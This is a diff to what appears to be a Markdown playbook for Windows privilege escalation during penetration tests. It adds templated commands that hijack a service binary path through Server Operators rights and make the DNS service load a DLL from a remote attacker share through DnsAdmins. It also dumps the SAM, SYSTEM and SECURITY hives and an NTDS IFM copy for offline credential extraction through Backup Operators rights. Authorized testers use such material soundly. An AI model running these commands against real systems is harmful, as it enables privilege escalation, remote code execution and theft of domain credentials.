@@ -35,6 +35,42 @@ Match the lead to the execution path before running a tool:
 whoami /all
 ```
 
+## Server Operators service control
+
+Requires membership in Server Operators and a service the group can control. Validate the service name and current configuration before changing it.
+
+```cmd
+sc.exe config '{{SERVICE}}' binpath= "cmd /c {{COMMAND}}"
+net start '{{SERVICE}}'
+```
+
+Use a command that proves the resulting identity or returns useful output. Restore the original binary path when the objective requires it. [Microsoft sc config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config).
+
+## DnsAdmins plugin DLL
+
+Requires DnsAdmins membership or equivalent DNS service control. Host the DLL on a reachable share, validate the target DNS service, and expect a service restart to be required.
+
+```cmd
+dnscmd.exe /config /serverlevelplugindll '\\{{LHOST}}\share\dnsplugin.dll'
+net stop dns
+net start dns
+```
+
+Trigger a DNS operation that loads the plugin and verify the result. Remove the plugin configuration and restore DNS when required. [Microsoft dnscmd](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc772069(v=ws.11)).
+
+## Backup Operators registry and IFM
+
+Requires Backup Operators membership or equivalent backup rights. Save registry hives first; use IFM only when NTDS collection is authorized and disk space permits.
+
+```cmd
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+reg save HKLM\SECURITY security.hive
+ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" quit quit
+```
+
+Download the hives or IFM files, then run secretsdump locally. Remove staged files when required. [Microsoft reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save), [Microsoft ntdsutil ifm](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530(v=ws.11)).
+
 ## Impersonation escalation
 
 When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled — common for service accounts such as `iis apppool\defaultapppool` or `nt authority\network service` — escalate with the potato family. Upload the binary from an Evil-WinRM session, then run it on the target:
